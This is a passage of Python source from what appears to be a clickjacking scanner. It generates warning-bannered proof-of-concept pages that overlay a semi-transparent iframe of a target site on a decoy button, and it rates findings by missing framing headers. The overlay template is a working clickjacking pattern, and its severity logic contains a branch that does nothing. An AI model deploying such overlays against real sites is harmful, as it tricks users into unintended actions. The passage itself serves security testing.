                                     opacity: float, action_description: str) -> str:
        """Generate partial overlay (button hijacking) PoC HTML."""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC - Partial Overlay</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }}
        
        .warning {{
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background-color: #ff0000;
            color: white;
            padding: 10px;
            text-align: center;
            z-index: 9999;
            font-weight: bold;
        }}
        
        .container {{
            position: relative;
            width: 100%;
            height: 100vh;
            margin-top: 40px;
            background-color: #f0f0f0;
        }}
        
        #target-frame {{
            position: absolute;
            width: 100%;
            height: 100%;
            border: none;
            opacity: {opacity};
            z-index: 2;
        }}
        
        .partial-overlay {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 300px;
            background: linear-gradient(to bottom, rgba(255,255,255,1) 0%, rgba(255,255,255,0) 100%);
            z-index: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        
        .action-button {{
            background-color: #2196F3;
            border: none;
            color: white;
            padding: 15px 30px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
            pointer-events: none;
        }}
    </style>
</head>
<body>
    <div class="warning">
        ‚ö†Ô∏è SECURITY RESEARCH - PROOF OF CONCEPT ‚ö†Ô∏è<br>
        This demonstrates button hijacking. The semi-transparent frame allows seeing
        the target page while a decoy button suggests different functionality.
    </div>
    
    <div class="container">
        <div class="partial-overlay">
            <button class="action-button">{overlay_text}</button>
        </div>
        <iframe id="target-frame" src="{target_url}"></iframe>
    </div>
    
    <script>
        // In a real attack, the iframe opacity and positioning would be
        // carefully tuned to maximize deception
        console.log('Partial overlay attack demonstrated');
    </script>
</body>
</html>"""
    
    def _save_poc(self, poc_html: str, target_url: str, config: Dict[str, Any]) -> str:
        """
        Save HTML PoC to file.
        
        Args:
            poc_html: HTML content
            target_url: Target URL
            config: Configuration dictionary
        
        Returns:
            Path to saved file
        """
        output_dir = config.get('output_dir', './clickjacking_reports')
        os.makedirs(output_dir, exist_ok=True)
        
        # Generate filename
        url_hash = hashlib.md5(target_url.encode()).hexdigest()[:8]
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'clickjacking_poc_{url_hash}_{timestamp}.html'
        poc_path = os.path.join(output_dir, filename)
        
        # Save file
        with open(poc_path, 'w') as f:
            f.write(poc_html)
        
        logger.info(f"PoC saved: {poc_path}")
        return poc_path
    
    def _determine_severity(self, header_analysis: Dict[str, Any],
                           vulnerability_data: Dict[str, Any]) -> str:
        """
        Determine severity level based on context.
        
        Args:
            header_analysis: Results from header analysis
            vulnerability_data: Vulnerability context data
        
        Returns:
            Severity level string
        """
        # Default to medium
        severity = 'medium'
        
        # Check if this is a sensitive action
        action_desc = vulnerability_data.get('action_description', '').lower()
        sensitive_keywords = [
            'payment', 'transfer', 'delete', 'admin', 'password',
            'credential', 'account', 'purchase', 'money', 'financial'
        ]
        
        if any(keyword in action_desc for keyword in sensitive_keywords):
            severity = 'high'
        
        # If there's no protection at all, increase severity
        protection_level = header_analysis.get('protection_level', 'none')
        if protection_level == 'none':
            if severity == 'medium':
                severity = 'medium'  # Keep as medium for basic pages
            elif severity == 'high':
                severity = 'high'  # Already high, keep it
        
        return severity
    
    def _build_evidence_description(self, header_analysis: Dict[str, Any],
                                    frameability_result: Dict[str, Any]) -> str:
        """
        Build evidence description for the finding.
        
        Args:
            header_analysis: Header analysis results
            frameability_result: Frameability test results
        
        Returns:
            Evidence description string
        """
        evidence_parts = []
        
        # Header information
        xfo = header_analysis.get('x_frame_options')
        csp_fa = header_analysis.get('csp_frame_ancestors')
        
        if not xfo:
            evidence_parts.append("No X-Frame-Options header present")
        else:
            evidence_parts.append(f"X-Frame-Options: {xfo}")
        
        if not csp_fa:
            evidence_parts.append("No CSP frame-ancestors directive present")
        else:
            evidence_parts.append(f"CSP frame-ancestors: {csp_fa}")
        
        # Frameability test result
        if frameability_result.get('frameable'):
            evidence_parts.append("Browser test confirmed page is frameable")
        
        # Screenshot
        if frameability_result.get('screenshot_path'):
            evidence_parts.append(f"Screenshot: {frameability_result['screenshot_path']}")
        
        return "; ".join(evidence_parts)
    
    def _cleanup(self) -> None:
        """Clean up temporary resources."""
        # Close all browser drivers
        for driver in self._drivers:
            try:
                driver.quit()
            except Exception as e:
                logger.warning(f"Error closing driver: {e}")
        self._drivers.clear()
        
        # Clean up temporary directories
        for temp_dir in self._temp_dirs:
            try:
                if os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir)
            except Exception as e:
                logger.warning(f"Error cleaning up temp dir {temp_dir}: {e}")
        self._temp_dirs.clear()
    
    def __del__(self):
        """Destructor to ensure cleanup."""
        self._cleanup()
